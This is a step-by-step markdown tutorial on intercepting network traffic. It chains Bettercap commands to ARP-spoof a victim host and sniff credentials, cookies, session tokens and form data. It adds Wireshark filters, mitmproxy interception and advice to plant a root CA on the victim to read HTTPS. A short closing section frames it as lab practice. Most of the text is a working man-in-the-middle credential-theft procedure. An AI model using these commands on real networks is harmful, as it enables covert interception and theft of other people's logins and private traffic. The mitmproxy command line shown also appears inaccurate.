## 🔧 HOW TO SPY ON NETWORK DEVICES IN A LAB

### 🛠 Tools You Can Use:

* `Bettercap`: ARP spoof + real-time sniffing
* `Wireshark`: Detailed packet analysis
* `mitmproxy`: Intercept and manipulate HTTP/HTTPS
* `tcpdump`: Lightweight terminal-based sniffer

---

### ✅ STEP-BY-STEP: Using Bettercap for Credential & Traffic Capture

#### 1. **Start Bettercap with the right network interface:**

```bash
sudo bettercap -iface eth0
```

#### 2. **Enable IP forwarding**

```bash
set net.ipv4.forwarding true
```

#### 3. **Set ARP spoofing target (victim)**

```bash
set arp.spoof.targets 192.168.1.10
arp.spoof on
```

#### 4. **Enable sniffer**

```bash
net.sniff on
set net.sniff.verbose true
```

#### 5. **Capture specific types of data**

Bettercap will automatically detect:

* HTTP basic/digest authentication
* FTP, POP3, IMAP, SMTP credentials
* Visited websites
* POST form data (unencrypted)

#### 6. **Log results to a file**

```bash
set net.sniff.output logs/session.pcap
```



### What You Can Capture

| Protocol     | Data Capturable                     | Notes                                    |
| ------------ | ----------------------------------- | ---------------------------------------- |
| **HTTP**     | Usernames, passwords, URLs, forms   | Most useful, unencrypted                 |
| **HTTPS**    | Limited, unless using mitmproxy     | HSTS often blocks SSL stripping          |
| **FTP/SMTP** | Login creds, commands               | Captured in plaintext                    |
| **DNS**      | Hostnames being resolved            | Reveals websites visited                 |
| **Cookies**  | Session tokens, sometimes auth info | Via `Set-Cookie` headers in HTTP traffic |



## Alternative Tools

### **Wireshark**

Capture on interface:

```bash
sudo wireshark
```

Apply filters:

* `http.request.method == "POST"`
* `ftp`
* `dns`

### **mitmproxy** (for HTTPS intercept)

```bash
mitmproxy -i eth0
```

It acts as an intercepting proxy. You can view, modify, and log requests/responses.



## Modern Limitation: HTTPS

Most credentials are now protected by HTTPS + HSTS. You’ll see the traffic, but not the **plaintext content** unless:

* You install your own root CA on the victim (for mitmproxy)
* You target **unencrypted** protocols



## Want to Try It in a Safe Lab?

You can use:

* **Kali VM** (attacker)
* **Metasploitable** or **DVWA** (victim)
* **VirtualBox NAT Network** or **Bridged mode**

